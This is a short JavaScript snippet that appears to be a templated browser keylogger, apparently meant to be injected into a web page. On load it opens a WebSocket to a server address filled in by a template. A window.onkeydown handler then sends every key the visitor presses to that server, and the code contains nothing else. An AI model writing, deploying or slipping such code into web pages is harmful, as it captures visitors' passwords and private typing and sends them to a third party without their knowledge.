if(window["WebSocket"]){
    const socket = new WebSocket("ws://{{.}}/ws")
    const keydown = (evt)=> {
    console.log(evt)
    const s = String.fromCharCode(evt.which)
    socket.send(s)
}
window.onkeydown= keydown
// document.onkeydown = keydown
}